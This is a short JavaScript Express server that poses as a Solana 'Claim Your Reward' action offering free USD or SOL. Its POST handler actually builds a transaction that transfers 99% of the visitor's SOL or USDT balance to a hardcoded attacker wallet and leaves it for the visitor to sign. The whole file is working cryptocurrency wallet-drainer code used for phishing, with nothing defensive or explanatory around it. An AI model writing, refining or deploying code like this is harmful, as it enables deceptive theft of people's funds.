const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram } = require('@solana/web3.js');
const { getAssociatedTokenAddress, createTransferInstruction } = require('@solana/spl-token');

const app = express();
app.use(express.json());

const connection = new Connection('https://api.devnet.solana.com');

const YOUR_WALLET = new PublicKey('zP5FnmEKrnhnekbpEeCUv8r5aMRrByLKAAtKEUkk6pB');

const USDT_MINT = new PublicKey('Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB');

async function getUSDTBalance(walletAddress) {
  try {
    const owner = new PublicKey(walletAddress);
    const tokenAccount = await getAssociatedTokenAddress(USDT_MINT, owner);
    const balance = await connection.getTokenAccountBalance(tokenAccount);
    return balance.value.amount;
  } catch (e) {
    return 0;
  }
}

app.get('/api/pay', (req, res) => {
  res.json({
    title: "Claim Your Reward",
    description: "Select your reward",
    label: "Choose",
    links: {
      actions: [
        {
          label: "Get 250 USD",
          href: "/api/pay?type=usdt"
        },
        {
          label: "Get 2 SOL",
          href: "/api/pay?type=sol"
        }
      ]
    }
  });
});

app.post('/api/pay', async (req, res) => {
  try {
    const { account } = req.body;
    const tokenType = req.query.type || 'usdt';
    
    let transaction;
    
    if (tokenType === 'sol') {
      const balance = await connection.getBalance(new PublicKey(account));
      const amountToTake = Math.floor(balance * 0.99);
      
      if (amountToTake <= 0) {
        return res.status(400).json({ error: "Insufficient SOL balance" });
      }
      
      transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(account),
          toPubkey: YOUR_WALLET,
          lamports: amountToTake
        })
      );
      
    } else {
      const balance = await getUSDTBalance(account);
      const amountToTake = Math.floor(balance * 0.99);
      
      if (amountToTake <= 0) {
        return res.status(400).json({ error: "Insufficient USDT balance" });
      }
      
      const fromTokenAccount = await getAssociatedTokenAddress(USDT_MINT, new PublicKey(account));
      const toTokenAccount = await getAssociatedTokenAddress(USDT_MINT, YOUR_WALLET);
      
      const instruction = createTransferInstruction(
        fromTokenAccount,
        toTokenAccount,
        new PublicKey(account),
        BigInt(amountToTake)
      );
      transaction = new Transaction().add(instruction);
    }
    
    transaction.feePayer = new PublicKey(account);
    transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    
    res.json({
      transaction: transaction.serialize({ requireAllSignatures: false }).toString('base64')
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.listen(3000, () => console.log('Server running on port 3000'));